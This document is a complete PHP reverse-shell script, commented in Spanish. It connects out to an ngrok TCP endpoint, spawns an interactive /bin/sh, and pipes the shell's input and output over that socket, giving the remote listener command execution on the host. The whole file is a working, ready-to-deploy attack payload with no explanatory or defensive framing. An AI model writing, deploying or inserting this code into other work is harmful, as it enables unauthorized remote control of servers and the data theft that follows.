<?php
set_time_limit(0);
$ip = '0.tcp.sa.ngrok.io';  // Host de ngrok
$port = 15383;              // Puerto asignado por ngrok

$sock = fsockopen($ip, $port);
if (!$sock) {
    die("No se pudo conectar al host $ip en el puerto $port");
}

$proc = proc_open('/bin/sh -i', array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
), $pipes);

// Redireccionar el socket al shell
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
stream_set_blocking($sock, false);

while (1) {
    if (feof($sock)) break;

    $read = [$sock, $pipes[1], $pipes[2]];
    $write = $except = null;
    stream_select($read, $write, $except, null);

    foreach ($read as $r) {
        if ($r === $sock) {
            fwrite($pipes[0], fread($sock, 2048));
        } else {
            fwrite($sock, fread($r, 2048));
        }
    }
}

fclose($sock);
proc_close($proc);
?>
